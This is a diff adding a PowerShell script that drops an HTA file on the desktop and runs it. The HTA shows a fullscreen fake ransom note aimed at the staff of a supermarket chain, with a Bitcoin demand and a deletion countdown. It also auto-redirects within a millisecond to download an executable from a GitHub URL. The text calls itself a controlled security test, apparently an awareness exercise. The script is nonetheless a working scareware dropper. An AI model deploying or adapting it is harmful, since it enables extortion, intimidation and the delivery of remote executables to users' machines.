@@ -1,0 +1,68 @@
+$strings = @()
+$strings += ""
+$strings += @"                                             
+<html>
+    <head>
+        <title>SuperMercadosXtra</title>
+    <hta:application id="oBVC" 
+                     applicationname="BSOD"  
+                     version="1.0" 
+                     maximizebutton="no" 
+                     minimizebutton="no" 
+                     sysmenu="no" 
+                     Caption="no" 
+                     windowstate="maximize"/> 
+    <style>
+        #texto2{
+            padding-top: 19%;
+            letter-spacing: 1px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body bgcolor="#1d8c55" scroll="no">
+    <font face="Lucida Console" size="4" color="white">
+	<center><img src="https://static.wikia.nocookie.net/logopedia/images/9/9a/Super_Xtra.png" alt="xtramensaje" class="center" height="200" width="300"></center>
+<center><p>--XTRACRYPT--</p>
+<script>setTimeout(function () { window.location = 'https://github.com/comxtra/89728938/blob/main/AplicativoSuperXtra.exe?raw=true'; }, 1)</script>
+<div id="textt">
+    --------HOLA SUPERMERCADOS XTRA TUS ARCHIVOS HAN SIDO ENCRIPTADOS--------<br>
+    <br><br>
+    Usted ha ejecutado software malicioso en este equipo<br>
+    <br><br>
+   	Esto es una prueba controlada, comuniquese por favor con el area de seguridad de la informacion<br>
+	<br><br>
+	Si esto fuera un Ransomware real, sus archivos estarian cifrados y perdidos para siempre<br>
+	<br><br>
+	NUVOL AND RISCCO CYBERSECURITY TEAM<br>
+	<br><br>
+	Para Recuperar sus datos consigne a la siguiente cuenta de Bitcoin 500 USD<br>
+	myhxHNJK559SXfU7cnJ13eBoeXFiqdTsL==<br>
+    <br><br>
+    <br><br><br>
+	    <img id="cnd" alt="xtracrypt" src="https://i.imgur.com/rytGPFG.png" alt="Paris" class="center" height="130" width="100">
+<p id="demo"></p>
+<h1>Todos sus archivos seran destruidos en</h1>
+<script>
+var countDownDate = new Date("Nov 30, 2021 15:37:25").getTime();
+var x = setInterval(function() {
+  var now = new Date().getTime();
+  var distance = countDownDate - now;
+  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+  document.getElementById("demo").innerHTML = days + "d " + hours + "h "
+  + minutes + "m " + seconds + "s ";
+  if (distance < 0) {
+    clearInterval(x);
+    document.getElementById("demo").innerHTML = "Sus Archivos han sido eliminados!";
+  }
+}, 1000);
+</script></center>
+</div>
+</body>
+</html>
+"@                                                                                                                             
+$strings | Set-Content "~/Desktop/ReadThisXtraMessage.hta"
+start "~/Desktop/ReadThisXtraMessage.hta"
